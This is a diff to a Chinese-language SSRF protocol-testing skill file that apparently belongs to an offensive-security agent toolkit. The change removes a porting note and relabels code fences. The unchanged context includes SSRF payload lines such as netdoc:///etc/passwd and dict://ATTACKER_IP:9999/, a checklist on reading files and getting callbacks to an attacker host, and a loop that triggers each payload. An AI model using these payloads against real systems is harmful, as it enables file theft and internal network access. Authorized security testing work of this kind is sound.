@@ -4,7 +4,7 @@ description: 'SSRF 协议测试矩阵：file/http/netdoc/gopher 逐个试 → �
 whenToUse: '目标有 SSRF 且内网地址/元数据被过滤时：先跑协议矩阵定能力，再按绕过节过一遍黑名单。'
 metadata: { domain: web, tier: T1 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+
 
 # SSRF 协议测试矩阵
 
@@ -26,7 +26,7 @@ netdoc:///etc/passwd        # Java netdoc — 同 file://
 dict://ATTACKER_IP:9999/    # Dict 协议
 jar://                      # Java JAR — 可能远程加载类
 ftp://                       # FTP — 可能读取/写入
-```
+```text
 
 ## 2. SSRF 能力分级
 
@@ -54,7 +54,7 @@ ftp://                       # FTP — 可能读取/写入
 
 ## 3. 每个协议的关键问题
 
-```
+```text
 [ ] file:// → 能读哪些文件？（用户的 home？/etc？root-owned？）
 [ ] file:// → 能列目录吗？（末尾 /）
 [ ] http:// → 能出外网吗？（AttackerIP 收到回调？）
@@ -65,7 +65,7 @@ ftp://                       # FTP — 可能读取/写入
 [ ] http:// → 跟随重定向吗？（Java URLConnection 默认跟随）
 [ ] gopher:// → 可用吗？（构造任意 TCP 流的关键）
 [ ] ftp:// → 支持上传吗？（通常不支持 STOR）
-```
+```text
 
 ## 4. DevArea 实测结果
 
@@ -94,4 +94,4 @@ PROTOCOLS = [
 for url, desc in PROTOCOLS:
     trigger_ssrf(url)
     print(f"{desc}: check listener")
-```
+```text
